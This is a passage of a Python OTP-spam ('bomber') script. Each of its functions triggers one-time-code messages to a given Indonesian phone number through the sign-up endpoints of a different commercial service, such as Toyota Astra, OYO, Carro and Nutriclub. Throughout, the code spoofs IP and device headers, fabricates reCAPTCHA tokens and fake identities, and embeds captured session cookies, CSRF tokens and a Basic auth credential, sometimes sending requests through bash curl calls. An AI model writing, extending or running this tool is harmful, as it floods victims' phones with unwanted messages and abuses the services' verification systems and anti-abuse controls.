        fingerprint_add = ''.join(random.choices('0123456789abcdef', k=32))
        ip_address = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
        request_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        
        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Language': 'id',
            'Channel': 'WEB',
            'Country-Code': 'ID',
            'Channel-Device': 'Chrome',
            'Channel-Fingerprint': fingerprint,
            'Channel-Fingerprint-Additional': fingerprint_add,
            'Ip-Address': ip_address,
            'Channel-App-Version': '2.27.16',
            'Request-Id': request_id,
            'x-queueit-ajaxpageurl': 'https%3A%2F%2Ftiptip.id%2Fsign-up%3Fref%3D%252F',
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
            ]),
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site'
        }
        
        payload = {
            'action': 'SIGN_UP',
            'delivery_method': 'WA',
            'phone_number': nomor,
            'country_code': '62'
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=15)
        return resp.status_code == 200
    except:
        return False

def spam_otp_labamu(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        elif nomor.startswith('+62'):
            nomor = nomor
        else:
            nomor = '+62' + nomor
        
        import uuid
        device_id = str(uuid.uuid4())
        
        url = 'https://api.cashenable.com/authentication/v2/coreauth'
        
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache, no-store, must-revalidate, max-age=0',
            'content-type': 'application/json',
            'device_id': device_id,
            'device_name': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'device_type': 'desktop',
            'expires': '0',
            'origin': 'https://desktop.labamu.co.id',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://desktop.labamu.co.id/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'source': 'Desktop',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36'
        }
        
        payload = {
            "identifier": nomor,
            "auth_method": "whatsapp"
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 201
        
    except Exception as e:
        return False
        
def spam_otp_toyota(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor
        else:
            nomor = '62' + nomor

        import random
        first = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fajar', 'Gina', 'Hana', 'Irwan', 'Joko', 'Rina', 'Sari', 'Agus', 'Bayu']
        last = ['Santoso', 'Wijaya', 'Susanto', 'Rahayu', 'Kusuma', 'Pratama', 'Sari', 'Putra', 'Wati', 'Hidayat', 'Lestari', 'Gunawan']
        nama = f'{random.choice(first)} {random.choice(last)}'
        email = f"{nama.lower().replace(' ', '')}{random.randint(10, 99)}@gmail.com"
        
        url_token = 'https://data-web.tam-icm.com/api/public/vendors/tokenize'
        headers_token = {
            'Authorization': 'Basic ZGlkeDpUb3lvdGEyMDI0',
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Origin': 'https://www.toyota.astra.co.id',
            'Referer': 'https://www.toyota.astra.co.id/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        payload_token = {
            "data": [nomor, nama, email]
        }
        
        resp_token = requests.post(url_token, json=payload_token, headers=headers_token, timeout=10)
        token_data = resp_token.json()
        
        phone_token = None
        if isinstance(token_data, list):
            for item in token_data:
                if item.get('status') == 'Succeed' and item.get('token'):
                    phone_token = item.get('token')
                    break
        
        if not phone_token:
            return False
        
        url = 'https://data-web.tam-icm.com/api/public/vendors/register'
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://www.toyota.astra.co.id',
            'pragma': 'no-cache',
            'referer': 'https://www.toyota.astra.co.id/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36'
        }
        payload = {
            "phoneNumber": phone_token
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
        
    except Exception as e:
        return False

def spam_otp_nutriclub(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor
        elif nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        else:
            nomor = '0' + nomor

        session = requests.Session()

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-length': '0',
            'origin': 'https://www.nutriclub.co.id',
            'priority': 'u=1, i',
            'referer': 'https://www.nutriclub.co.id/membership/api/otp',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest'
        }

        params = {
            'phone': nomor,
            'old_phone': nomor
        }

        url = 'https://www.nutriclub.co.id/membership/otp/'

        resp = session.post(url, params=params, headers=headers, timeout=10)

        if resp.status_code == 200:
            try:
                data = resp.json()
                if data.get('status') == 'success' or data.get('success') == True:
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False
        
def spam_otp_oyorooms(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        
        nomor = ''.join(filter(str.isdigit, nomor))
        
        if len(nomor) < 10:
            return False
        
        session = requests.Session()
        
        cookies = {
            'delta_ver': '1783169391.895.680.781361|30a98be7397e93d8ee905a77f63b5c5a',
            '_csrf': 'z2qem89SAImhv-99mY7Qz43S',
            'acc': 'IN',
            'locale': 'id',
            'X-Location': 'undefined',
            'mab': 'bb752a6c73fad035dc2ea0697579750f',
            'expd': 'mww2%3A1%7Cioab%3A1%7Cmhdp%3A1%7Cbcrp%3A0%7Cpwbs%3A1%7Cslin%3A1%7Chsdm%3A2%7Ccomp%3A0%7Cnrmp%3A1%7Cnhyw%3A1%7Cgcer%3A1%7Crecs%3A1%7Cswhp%3A1%7Clvhm%3A1%7Cgmbr%3A0%7Cyolo%3A1%7Crcta%3A1%7Ccbot%3A1%7Cotpv%3A1%7Ctrtr%3A0%7Clbhw%3A1%7Cndbp%3A0%7Cmapu%3A1%7Cnclc%3A1%7Cdwsl%3A1%7Ceopt%3A1%7Cotpv%3A1%7Cwizi%3A1%7Cmorr%3A1%7Cyopb%3A0%7CTTP%3A1%7Caimw%3A1%7Chdpn%3A0%7Cweb2%3A0%7Cspw1%3A0%7Cstrf%3A1%7Cltvr%3A1%7Cwizz%3A1%7Clpcp%3A1%7Cclhp%3A1%7Cprwt%3A1%7Ccbhd%3A1%7Cins2%3A3%7Cmcal%3A1%7Cmhdc%3A1%7Cmcal%3A1%7Clopo%3A1%7Cptax%3A1%7Ciiat%3A0%7Cpbnb%3A0%7Cror2%3A1%7Cmbwe%3A0%7Cmboe%3A0%7Cctry%3A1%7Cmshd%3A1%7Csovb%3A2%7Cctrm%3A1%7Cofcr%3A1%7Ciupi%3A1%7Cnbi1%3A3%7Crwtg%3A1%7Cstow%3A1%7Cimtg%3A2%7Cptpa%3A1%7Cormp%3A1%7Cpbre%3A0%7Cllat%3A0%7Cesmi%3A0%7Chdam%3A0',
            'appData': '%7B%22userData%22%3A%7B%22isLoggedIn%22%3Afalse%7D%7D',
            'token': 'SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc%3D',
            '_uid': 'Not%20logged%20in',
            'XSRF-TOKEN': 'bYRZoRu5-6fyXF51wSMdrrS0EAYDpphLOsfw',
            'ql': 'true',
            '_gcl_au': '1.1.1098408214.1783169392',
            'isHomepageViewed': 'true',
            'fingerprint2': 'a19e43fe531de889917ff09bd9c00e3b',
            '_ga': 'GA1.2.301009132.1783169392',
            '_gid': 'GA1.2.1435061004.1783169397'
        }
        
        session.cookies.update(cookies)
        
        fingerprint = "a19e43fe531de889917ff09bd9c00e3b"
        device_id = fingerprint + "530311"
        sdata = "eyJrdWQiOlsyNDIwMCwxNDUwMCwxMjcwMCwxOTUwMCwxMzkwMCwxNDAwMCwxNDUwMCwxNzAwMCwxMzcwMCwxMzAwMCwxMTkwMF0sImFjYyI6W10sImd5ciI6W10sInR1ZCI6WzE2MDAsMzAyMDAsNDQ5MDAsNDE1NzAwLDMxMTUwMCwyOTY4MDAsMzQ1NDAwLDM5NTcwMCwyOTYyMDAsMjEzODAwLDk2NTAwLDk3NjAwLDExMjEwMCwxNzkyMDAsMTE0NjAwLDE0NjcwMCw5NjQwMCwzMjY0MDAsMzQ0NjAwLDMyODQwMCwzMjgwMDAsMzYwNzAwLDUxMTMwMCw2NDQ0MDAsMzEzNzAwLDI4NzAwLDYxNjAwLDk1MzAwXSwidGlkIjpbNTYzMTAwMCwxNzM2MDIwMCw2MTk4MTAwLDExMzQwMDAsMzA0MjAwLDIwMTkwMCwyMjA5MDAsMjIwNTAwLDE4NjcwMCwxNjkwMDAsNTY4ODAwLDcwMjMwMCw5Njk5MDAsMjg3MDAwLDUzNTAwMCw3MTg3MDAsNjAyODAwLDEyMjE2MDAsMTcxMTAwLDIwNjEwMCwyMjA0MDAsMTg4MzAwLDE3MTMwMCw2NTYwMDAsMzM1NzAwLDM4NjgwMCw4MDIyNzgwMCwxMTc5MzQwMF0sImtpZCI6WzEyNzM5MTEwMCwxOTM1MDAsMjMyMTAwLDIyMjUwMCwyNDU5MDAsMjY5MzAwLDE1MjMwMCwyMzQ2MDAsMTY2NjAwLDIwNDEwMCwxODYyMDBdLCJ0bXYiOltbeyJ4IjoyNDcsInkiOjM2OX0seyJ4IjoyNTUsInkiOjM0Mn0seyJ4IjozMjcsInkiOjE4OX0seyJ4IjozMzUsInkiOjE3Nn1dLFt7IngiOjI1NSwieSI6MzYyfSx7IngiOjI1OSwieSI6MzU0fSx7IngiOjM0NywieSI6MTc4fSx7IngiOjM1MSwieSI6MTcyfV0sW3sieCI6MjQwLCJ5Ijo1MTZ9LHsieCI6MjM4LCJ5Ijo1MjZ9LHsieCI6MjM3LCJ5Ijo1Mzh9LHsieCI6MjM3LCJ5Ijo1NDB9LHsieCI6MjM3LCJ5Ijo1Mzl9XSxbeyJ4IjoyNTUsInkiOjM1MX0seyJ4IjoyNTMsInkiOjM1OX0seyJ4IjoyMzUsInkiOjUwMH0seyJ4IjoyMzUsInkiOjUyNX0seyJ4IjoyMzUsInkiOjUzN31dLFt7IngiOjIwMCwieSI6MzIxfSx7IngiOjIwNSwieSI6MzA3fSx7IngiOjIyMywieSI6MjU2fSx7IngiOjIyMywieSI6MjU2fV1dfQ=="
        
        headers = {
            'accept': '*/*',
            'accept-language': 'id',
            'content-type': 'application/json',
            'origin': 'https://identity-gateway.oyorooms.com',
            'referer': 'https://identity-gateway.oyorooms.com/login',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36',
            'access_token': 'SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=',
            'deviceid': device_id,
            'fingerprint_hash': fingerprint,
            'loc': '153',
            'sData': sdata,
            'externalHeaders': '[object Object]',
            'XSRF-TOKEN': 'bYRZoRu5-6fyXF51wSMdrrS0EAYDpphLOsfw'
        }
        
        payload = {
            "phone": nomor,
            "country_code": "+62",
            "nod": 4
        }
        
        r = session.post('https://identity-gateway.oyorooms.com/api/pwa/generateotp?locale=id',
            json=payload,
            headers=headers,
            timeout=10
        )
        
        if r.status_code == 200:
            try:
                data = r.json()
                status = data.get('status', '')
                is_user_present = data.get('is_user_present', False)
                
                if status == "correct" and is_user_present:
                    return True
                elif status == "correct" and not is_user_present:
                    return False
                else:
                    return False
            except:
                return True if r.status_code == 200 else False
        else:
            return False
        
    except Exception as e:
        return False

import traceback

def spam_otp_acc(nomor, next_action=None):
    try:
        nomor = nomor.strip().replace(' ', '').replace('-', '').replace('+', '')
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        url = 'https://www.acc.co.id/register/new-account'

        if not next_action:
            next_action = '7f30ed5f0a7a7e83aa9b719139b7491964815ba9f3'

        next_router_state = '%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D'

        headers = {
            'Accept': 'text/x-component',
            'Content-Type': 'text/plain;charset=UTF-8',
            'next-action': next_action,
            'next-router-state-tree': next_router_state,
            'Origin': 'https://www.acc.co.id',
            'Referer': 'https://www.acc.co.id/register/new-account',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }

        payload = [{"user_id": None, "action": "register", "send_to": nomor_lokal, "provider": "whatsapp"}]
        payload_str = json.dumps(payload)

        curl_command = f"curl -s -X POST '{url}' -H 'Accept: text/x-component' -H 'Content-Type: text/plain;charset=UTF-8' -H 'next-action: {next_action}' -H 'next-router-state-tree: {next_router_state}' -H 'Origin: https://www.acc.co.id' -H 'Referer: https://www.acc.co.id/register/new-account' --data-raw '{payload_str}'"

        resp = requests.post(url, data=payload_str, headers=headers, timeout=15)

        if resp.status_code != 200:
            return {'status': False, 'step': 'register', 'http_code': resp.status_code, 'response_text': resp.text[:300], 'curl': curl_command}

        data = None
        for line in resp.text.split('\n'):
            if line.startswith('1:'):
                try:
                    data = json.loads(line[2:])
                    break
                except json.JSONDecodeError:
                    pass

        if not data:
            return {'status': False, 'step': 'register', 'message': 'Gagal parse response', 'response_text': resp.text[:500], 'curl': curl_command}

        return {
            'status': data.get('status') is True,
            'step': 'register',
            'phoneNumber': nomor_lokal,
            'message': data.get('message', ''),
            'unique_key': data.get('data', {}).get('unique_key'),
            'provider': data.get('data', {}).get('provider'),
            'expired_at': data.get('data', {}).get('expired_at'),
            'response': data,
            'curl': curl_command
        }

    except requests.exceptions.Timeout:
        return {'status': False, 'step': 'error', 'message': 'Request timeout'}
    except requests.exceptions.ConnectionError:
        return {'status': False, 'step': 'error', 'message': 'Koneksi gagal'}
    except Exception as e:
        return {'status': False, 'step': 'error', 'message': str(e), 'traceback': traceback.format_exc()}
        
def spam_otp_carro(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        elif nomor.startswith('+62'):
            nomor = nomor
        else:
            nomor = '+62' + nomor
        
        import random
        import string
        
        recaptcha = ''.join(random.choices(string.ascii_letters + string.digits + "-_", k=500))
        
        url = 'https://carro.co/_actions/requestOtp/'
        
        headers = {
            'Host': 'carro.co',
            'sec-ch-ua-platform': '"Android"',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json',
            'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'Content-Type': 'application/json',
            'sec-ch-ua-mobile': '?1',
            'Origin': 'https://carro.co',
            'Referer': 'https://carro.co/id/id',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        }
        
        payload = {
            "countryCode": "id",
            "locale": "id",
            "mobileNumber": nomor,
            "provider": "whatsapp",
            "recaptchaResponse": recaptcha,
            "recaptchaAction": "id_idid_requestOtp"
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False

import subprocess
import uuid

def spam_otp_joob(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor
        elif nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        else:
            nomor = '0' + nomor

        nomor = ''.join(filter(str.isdigit, nomor))

        if not nomor.startswith('0'):
            nomor = '0' + nomor

        payload = json.dumps({
            "otpAuthType": "PHONE",
            "phoneNumber": nomor
        })

        device_id = str(uuid.uuid4())

        curl_cmd = f"""curl -s -X POST 'https://api.joob.asia/v3/auth/otp/issue' \
  -H 'host: api.joob.asia' \
  -H 'x-platform: MOBILE_WEB' \
  -H 'sec-ch-ua-platform: "Android"' \
  -H 'x-usertype: s' \
  -H 'sec-ch-ua: "Chromium";v="139", "Not;A=Brand";v="99"' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'x-lang: id' \
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36' \
  -H 'content-type: application/json' \
  -H 'x-deviceid: {device_id}' \
  -H 'accept: */*' \
  -H 'origin: https://grab.joob.id' \
  -H 'sec-fetch-site: cross-site' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://grab.joob.id/' \
  -H 'accept-encoding: gzip, deflate, br, zstd' \
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \
  -H 'priority: u=1, i' \
  -d '{payload}'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('otpAuthId'):
                    return True
                return False
            except json.JSONDecodeError:
                return False
        return False

    except Exception:
        return False

def spam_otp_buccheri(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor[1:]
        elif nomor.startswith('62'):
            phone = nomor[2:]
        elif nomor.startswith('+62'):
            phone = nomor[3:]
        else:
            phone = nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://member.buccheri.com/otp-sent' \\
  -H 'host: member.buccheri.com' \\
  -H 'cache-control: max-age=0' \\
  -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'upgrade-insecure-requests: 1' \\
  -H 'content-type: application/x-www-form-urlencoded' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
  -H 'origin: https://member.buccheri.com' \\
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: navigate' \\
  -H 'sec-fetch-user: ?1' \\
  -H 'sec-fetch-dest: document' \\
  -H 'referer: https://member.buccheri.com/otp' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _ga=GA1.1.517445661.1786009922; _clck=umhr0c%5E2%5Eg8d%5E0%5E2409; _clsk=furbu5%5E1786009926484%5E1%5E1%5Ez.clarity.ms%2Fcollect; _ga_4FSQVMN5FX=GS2.1.s1786009922$o1$g1$t1786009978$j4$l0$h0; ci_session=091bc4bfe7b2c6ab4427214bfbe54337138963cd' \\
  -H 'priority: u=0, i' \\
  --data-raw 'phonenumber={phone}&otptype=SIGNUP'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_generasimaju(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('0'):
            phone = '0' + phone
        
        import subprocess
        import json
        import base64
        import random
        import string
        
        firstname = ''.join(random.choices(string.ascii_lowercase, k=8))
        password = base64.b64encode(f"{firstname}12345".encode()).decode()
        csrf_token = "1a6d98f9901ed40ce571b56fa1d47869841a4eda"
        auth_token = "8af3153c67f9b3faf620b64706e18c08"
        
        curl_cmd = f"""curl -s -X POST 'https://www.generasimaju.co.id/klub-generasi-maju/register' \\
  -H 'host: www.generasimaju.co.id' \\
  -H 'x-newrelic-id: UA4HUV5TARAEUFFVAQQEUFY=' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-csrf-token: {csrf_token}' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'newrelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQ4MDA4MDkiLCJhcCI6IjUzODc5NTE1MCIsImlkIjoiNWJkMTE5ZTZlODllM2RiOSIsInRyIjoiN2IxNWViZmIyNGU0OTljYmZlMDNlYTJjYmEzMmI1ODUiLCJ0aSI6MTc4NzEzNjk0MTkxNiwidGsiOiIzMzIzOTI1In19' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'traceparent: 00-7b15ebfb24e499cbfe03ea2cba32b585-5bd119e6e89e3db9-01' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/javascript, */*; q=0.01' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'tracestate: 3323925@nr=0-1-4800809-538795150-5bd119e6e89e3db9----1787136941916' \\
  -H 'origin: https://www.generasimaju.co.id' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://www.generasimaju.co.id/klub-generasi-maju/register?referral=https://www.generasimaju.co.id/' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: prev_page_url=/; data_layer_method=Website; TCPID=126831854422550661387; _gid=GA1.3.2087259638.1787136887; _gat_UA-103522697-4=1; _tt_enable_cookie=1; _ttp=01M0CTHJ7ZZ53RDS1MBZ8F9B69_.tt.2; _clck=1lemkln%5E2%5Eg8q%5E0%5E2422; __stp=eyJ2aXNpdCI6Im5ldyIsInV1aWQiOiJlOTUxYzg1NC0zYzQzLTQxMDYtYWFlYS1iYzY0N2I2NmVhODIifQ%3D%3D; _td_ssc_id=01M0CTHMEQHN4WM22AN96N2MD6; __stgeo=IjAi; __stbpnenable=MA%3D%3D; __stdf=MA%3D%3D; PHPSESSID=d7f6086225b836d265dc047dc6526a3b; _fbp=fb.2.1787136896361.715334083778519977; iDSP_Cookie=0abf53f9-e262-4b2b-8a4a-739b0d159f83**1787136896679*8e2f9123e95944449a39a9a80babf9e4*; _ga=GA1.3.1942976718.1787136886; _td=b724781d-c825-49e6-91e0-23b4e09740b8; __sts=eyJzaWQiOjE3ODcxMzY4ODgzNjksInR4IjoxNzg3MTM2ODk5MDUzLCJ1cmwiOiJodHRwcyUzQSUyRiUyRnd3dy5nZW5lcmFzaW1hanUuY28uaWQlMkZrbHViLWdlbmVyYXNpLW1hanUlMkZyZWdpc3RlciUzRnJlZmVycmFsJTNEaHR0cHMlM0ElMkYlMkZ3d3cuZ2VuZXJhc2ltYWp1LmNvLmlkJTJGIiwicGV0IjoxNzg3MTM2ODk5MDUzLCJzZXQiOjE3ODcxMzY4ODgzNjksInBVcmwiOiJodHRwcyUzQSUyRiUyRnd3dy5nZW5lcmFzaW1hanUuY28uaWQlMkYiLCJwUGV0IjoxNzg3MTM2ODg4MzY5LCJwVHgiOjE3ODcxMzY4ODgzNjl9; _clsk=1l4an9c%5E1787136899807%5E2%5E1%5Eu.clarity.ms%2Fcollect; ttcsid_C4RIGKH6H18A0MH113T0=1787136887112::rCra0ykXy8_h7KsBM04x.1.1787136940557.1; ttcsid=1787136887119::o07SA2cbudxtC_Hsy8Yh.1.1787136940557.0::1.5427.11326::53296.11.324.1008::52530.9.297; _ga_KHHX33L6LL=GS2.1.s1787136886$o1$g1$t1787136940$j6$l0$h0; _gcl_au=1.1.1934825587.1787136884.805340981.1787136911.1787136910.1774024647.1787136891.1787136940; AWSALB=8iHBwm8IsmPXi2jxCtanEqkh0JjDaTqSPbmE916vmlFGE7miEu74AWb7HbujI5pbsSM91e5NQDNiPOkwU8OVf6ETe6nVzjkaTg2rjz5r2afzGw2JZRrPMJSS+xvy8SDN9TTeNCsEVlbj5wh+3L1Rez0aFheHI4kfDc+LNyUN4zf6s3p4YoBM8JF+etwf2A==; AWSALBCORS=8iHBwm8IsmPXi2jxCtanEqkh0JjDaTqSPbmE916vmlFGE7miEu74AWb7HbujI5pbsSM91e5NQDNiPOkwU8OVf6ETe6nVzjkaTg2rjz5r2afzGw2JZRrPMJSS+xvy8SDN9TTeNCsEVlbj5wh+3L1Rez0aFheHI4kfDc+LNyUN4zf6s3p4YoBM8JF+etwf2A==' \\
  -H 'priority: u=1, i' \\
  --data-raw 'firstname={firstname}&msisdn={phone}&password={password}&mother_status=7&ispregnant=Y&pregnancyweek=1&isonpregnancyprogram=N&children_dob=&is_code_refferal_event_code=&refferal_code_event_code=&query_params%5B0%5D%5Breferral%5D=https%3A%2F%2Fwww.generasimaju.co.id%2F&auth_token={auth_token}&auth_token_prefix=registration'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('status') == 'success' or data.get('success'):
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                if data.get('result') and 'success' in str(data.get('result')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_els(nomor):
    try:
        if nomor.startswith('0'):
            phone = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            phone = nomor[1:]
        elif nomor.startswith('62'):
            phone = nomor
        else:
            phone = '62' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        import subprocess
        import json
        import random
        import string
        
        name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 7)))
        
        curl_cmd = f"""curl -s -X POST 'https://member.els.id/api/publics/membership/auth/otp/register/send' \\
  -H 'host: member.els.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
